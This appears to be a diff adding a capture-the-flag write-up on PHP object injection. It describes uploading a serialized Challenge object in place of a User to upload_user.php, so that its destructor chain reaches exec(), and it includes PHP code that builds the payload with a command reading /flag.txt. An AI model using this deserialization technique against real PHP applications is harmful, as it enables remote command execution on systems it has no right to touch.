@@ -1,0 +1,26 @@
+First of all, it is convinient to look for fthe function unserialize with ctrl+f+shift
+then, we will find it in the file upload_user.php
+Here, basically, there is a button to load a file and it unserializes the file received.
+The trick is to pass a file with a Challenge object serialized instead of a User.
+In this way, it is possible to use __destruct() -> stop() -> exec()
+notice that the source code for the lasses is in data.php.
+However, with exec you can execute  linux command.
+The following code is the one used to serialized the object:
+<?php
+class Challenge{
+
+  public $name;
+  public $description;
+  public $setup_cmd="not null";
+  public $stop_cmd="cat /flag.txt";
+
+  function __construct($name, $description){
+    $this->name = $name;
+    $this->description = $description;
+  }
+}
+
+$user = new Challenge("cane2","a");
+//print_r($user);
+echo serialize($user);
+?> 
